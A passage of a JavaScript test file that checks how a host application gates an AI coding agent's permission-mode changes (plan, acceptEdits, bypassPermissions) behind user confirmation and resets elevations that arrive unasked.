		await tick()
		assert.ok(m.events.filter(e => e.t === 'ask').length, 'the next execute question is asked')
		assert.deepEqual(m.unasked, [])
		await m.cs.cancel(f.id)
		await next
		m.cs.dispose()
	}
})

test('without a plain approve option a no sends the plan\'s own "no", and the chat stays in plan', T, async () => {
	const { m, f } = await planSetup('foreign')
	m.S.warn = async () => undefined
	const options = PLAN_OPTIONS.filter(o => o.optionId !== 'exit-plan-default')
	const q = sinkOf(m, f).onPermission({ sessionId: f.sessionId, toolCall: { kind: 'switch_mode', title: 'Ready to code?', locations: [] }, options })
	await tick()
	m.cs.answer(f.id, askEvent(m.events).req, options.findIndex(o => o.optionId === 'exit-plan-bypass'))
	assert.deepEqual(await q, { outcome: { outcome: 'selected', optionId: 'reject' } })
	assert.equal(f.mode, 'plan')
})

test('an elevating plan answer that is confirmed is forwarded once and the chat takes the mode: no second modal, the adapter itself back in default', T, async () => {
	const { m, f } = await planSetup('foreign')
	const q = planQuestion(m, f)
	await tick()
	m.cs.answer(f.id, askEvent(m.events).req, optionIndex('exit-plan-bypass'))
	await q
	await tick()
	assert.deepEqual(m.answers, ['exit-plan-bypass'])
	assert.equal(m.S.warnings.length, 1, 'the one modal of the answer; the follow-up update asks nothing more')
	assert.equal(f.mode, 'bypassPermissions')
	assert.equal(modeOf(m.events), 'bypassPermissions')
	assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default')
	const done = await toolAsk(m, f, execAsk(f))
	assert.deepEqual(done, { outcome: { outcome: 'selected', optionId: 'a' } })
	assert.deepEqual(m.unasked, [], 'the question still passes through the host')
})

test('accept-edits as a plan answer asks in a foreign folder only', T, async () => {
	for (const [name, modals] of [['foreign', 1], ['own', 0]]) {
		const { m, f } = await planSetup(name)
		const q = planQuestion(m, f)
		await tick()
		m.cs.answer(f.id, askEvent(m.events).req, optionIndex('exit-plan-accept-edits'))
		await q
		await tick()
		assert.equal(m.S.warnings.length, modals, name)
		assert.deepEqual(m.answers, ['exit-plan-accept-edits'], name)
		assert.equal(f.mode, 'acceptEdits', name)
	}
})

test('cancelling while the plan answer\'s modal is open answers the question as cancelled; a later yes applies nothing', T, async () => {
	const { m, f } = await planSetup('foreign')
	const held = holdModal(m)
	const q = sinkOf(m, f).onPermission({ sessionId: f.sessionId, toolCall: { kind: 'switch_mode', title: 'Ready to code?', locations: [] }, options: PLAN_OPTIONS })
	await tick()
	m.cs.answer(f.id, askEvent(m.events).req, optionIndex('exit-plan-bypass'))
	await tick()
	await m.cs.cancel(f.id)
	assert.deepEqual(await q, { outcome: { outcome: 'cancelled' } })
	held.release('Switch Mode')
	await tick()
	assert.deepEqual(m.S.hosts[KIND].history, [])
	assert.equal(f.mode, 'plan')
})

test('a plan answer confirmed after the chat moved elsewhere is dropped: the plain approval goes instead, never the elevated mode', T, async () => {
	const { m, f } = await planSetup('foreign')
	const held = holdModal(m)
	const q = planQuestion(m, f)
	await tick()
	m.cs.answer(f.id, askEvent(m.events).req, optionIndex('exit-plan-bypass'))
	await tick()
	// The user moves the picker meanwhile.
	await m.cs.setOption(f.id, 'mode', 'default')
	held.release('Switch Mode')
	await q
	assert.deepEqual(m.answers, ['exit-plan-default'])
	assert.ok(!m.S.hosts[KIND].history.includes('bypassPermissions'))
	assert.equal(f.mode, 'default')
})

test('backstop: an elevated mode that arrives unasked is taken back to default first; the modal then decides: no keeps default, yes applies the mode', T, async () => {
	for (const yes of [false, true]) {
		const { m, f } = await planSetup('foreign')
		const held = holdModal(m)
		f.granted = 'bypassPermissions'
		planApproved(m, f, 'bypassPermissions')
		await tick()
		assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']], 'reset before the modal resolves')
		assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default')
		assert.equal(m.S.warnings.length, 1)
		held.release(yes ? 'Switch Mode' : undefined)
		await tick()
		assert.equal(f.mode, yes ? 'bypassPermissions' : 'default')
		assert.equal(modeOf(m.events), yes ? 'bypassPermissions' : 'default')
		assert.deepEqual(m.S.hosts[KIND].calls, [['set', 'mode', 'default']], 'nothing else is sent to the adapter')
		assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default', 'the adapter itself stays in default')
	}
})

test('backstop: a modal answered after the chat moved elsewhere does not apply the older elevated mode', T, async () => {
	const { m, f } = await planSetup('foreign')
	const held = holdModal(m)
	f.granted = 'bypassPermissions'
	planApproved(m, f, 'bypassPermissions')
	await tick()
	await m.cs.setOption(f.id, 'mode', 'plan')
	held.release('Switch Mode')
	await tick()
	assert.equal(f.mode, 'plan')
	assert.equal(modeOf(m.events), 'plan')
})

test('backstop: when the reset itself fails the session is closed, the turn cancelled and one fatal error says why', T, async () => {
	const { m, f } = await planSetup('foreign')
	const p = m.cs.prompt(f.id, 'go')
	await tick()
	m.events.length = 0
	m.S.failSet = true
	planApproved(m, f, 'bypassPermissions')
	await tick()
	assert.equal(f.dead, true)
	assert.equal(m.S.warnings.length, 0, 'no modal over a session that cannot be reset')
	const calls = m.S.hosts[KIND].calls
	assert.ok(calls.some(c => c[0] === 'cancel'))
	assert.deepEqual(calls.filter(c => c[0] === 'close'), [['close', f.sessionId]])
	m.S.hosts[KIND].turn.res({ stopReason: 'cancelled' })
	await p
	const errors = m.events.filter(e => e.t === 'error')
	assert.equal(errors.length, 1)
	assert.equal(errors[0].fatal, true)
	assert.match(errors[0].text, /permission mode could not be restored/)
	assert.notEqual(f.mode, 'bypassPermissions')
})

// ---- "allow all edits during this session" on an edit question: the adapter goes to acceptEdits without saying so ------------------------

const EDIT_OPTIONS = [
	{ optionId: 'allow-once', name: 'Yes', kind: 'allow_once' },
	{ optionId: 'allow-with-updates', name: 'Yes, allow all edits during this session', kind: 'allow_always' },
	{ optionId: 'reject', name: 'No', kind: 'reject_once' },
]
const withUpdates = EDIT_OPTIONS.findIndex(o => o.optionId === 'allow-with-updates')
/** A question of `kind` carrying those options; the stub adapter applies `allow-with-updates` as the real one does: acceptEdits, no update published, so one forwarded on an edit shows as an adapter that left default. */
function updatesAsk(m, chat, kind, file) {
	return sinkOf(m, chat).onPermission({ sessionId: chat.sessionId, toolCall: { kind, title: kind === 'edit' ? 'Edit' : 'npm test', locations: file ? [{ path: file }] : [] }, options: EDIT_OPTIONS }).then(res => {
		m.answers.push(res.outcome.optionId)
		if (res.outcome.optionId === 'allow-with-updates') {
			m.S.hosts[KIND].setMode(chat.sessionId, 'acceptEdits')
		}
		return res
	})
}

test('"allow all edits during this session" on an edit asks in a foreign folder; a no sends the plain "yes" and the mode stays default', T, async () => {
	const m = setup()
	m.answers = []
	const f = await openIn(m, 'foreign')
	m.S.warnings.length = 0
	m.S.hosts[KIND].history.length = 0
	const held = holdModal(m)
	let settled = false
	const q = updatesAsk(m, f, 'edit', join(m.foreign, 'a.txt')).then(r => { settled = true; return r })
	await tick()
	m.cs.answer(f.id, askEvent(m.events).req, withUpdates)
	await tick()
	assert.equal(m.S.warnings.length, 1, 'the modal is shown')
	assert.match(m.S.warnings[0].message, /acceptEdits/)
	assert.equal(settled, false, 'the adapter has not heard it yet')
	held.release(undefined)
	assert.deepEqual(await q, { outcome: { outcome: 'selected', optionId: 'allow-once' } })
	assert.deepEqual(m.answers, ['allow-once'])
	assert.deepEqual(m.S.hosts[KIND].history, [], 'the adapter never left default')
	assert.equal(f.mode, 'default')
})

test('"allow all edits during this session" confirmed in a foreign folder, or in the own folder without a question: the adapter hears only the plain yes, the chat takes acceptEdits and the picker follows', T, async () => {
	for (const [name, modals] of [['foreign', 1], ['own', 0]]) {
		const m = setup()
		m.answers = []
		const f = await openIn(m, name)
		m.S.warnings.length = 0
		m.S.hosts[KIND].history.length = 0
		const q = updatesAsk(m, f, 'edit', join(m[name], 'a.txt'))
		await tick()
		const ask = m.events.find(e => e.t === 'ask')
		assert.ok(ask, name + ': asked')
		m.events.length = 0
		m.cs.answer(f.id, ask.req, withUpdates)
		await q
		await tick()
		assert.equal(m.S.warnings.length, modals, name)
		assert.deepEqual(m.answers, ['allow-once'], name + ': allow-with-updates is never forwarded')
		assert.equal(f.mode, 'acceptEdits', name)
		assert.equal(modeOf(m.events), 'acceptEdits', name + ': the picker follows')
		assert.deepEqual(m.S.hosts[KIND].history, [], name + ': the adapter never left default, and nothing reset it')
		assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default', name)
		assert.deepEqual(m.S.hosts[KIND].calls.filter(c => c[0] === 'set'), [], name + ': no mode was sent to the adapter')
		m.events.length = 0
		// Insilode's own rule now answers: inside the folder yes, outside it asks.
		const inside = await sinkOf(m, f).onPermission(editAsk(f, join(m[name], 'b.txt')))
		assert.deepEqual(inside, { outcome: { outcome: 'selected', optionId: 'a' } }, name)
		const outside = sinkOf(m, f).onPermission(editAsk(f, join(m.home, 'elsewhere.txt')))
		await tick()
		assert.ok(m.events.find(e => e.t === 'ask'), name + ': an edit elsewhere still asks')
		await m.cs.cancel(f.id)
		await outside
		m.cs.dispose()
	}
})

test('picking Default always reaches the adapter, even when the cached mode already says default', T, async () => {
	const m = setup()
	const f = await openIn(m, 'foreign')
	// The adapter was elevated without telling: the cache still shows default.
	m.S.hosts[KIND].setMode(f.sessionId, 'acceptEdits')
	await m.cs.setOption(f.id, 'mode', 'default')
	assert.equal(m.S.hosts[KIND].modes.get(f.sessionId), 'default')
	assert.ok(m.S.hosts[KIND].calls.some(c => c[0] === 'set' && c[1] === 'mode' && c[2] === 'default'))
})

test('"allow-with-updates" on a command question only adds rules: forwarded as it is, no modal, no mode change', T, async () => {
	const m = setup()
	m.answers = []
	const f = await openIn(m, 'foreign')
	m.S.warnings.length = 0
	m.S.hosts[KIND].history.length = 0
	const q = updatesAsk(m, f, 'execute')
	await tick()
	const ask = askEvent(m.events)
	m.events.length = 0
	m.cs.answer(f.id, ask.req, withUpdates)
	await q
	await tick()
	assert.equal(m.S.warnings.length, 0)
	assert.deepEqual(m.answers, ['allow-with-updates'])
	assert.equal(f.mode, 'default')
	assert.equal(m.events.filter(e => e.t === 'config').length, 0)
})
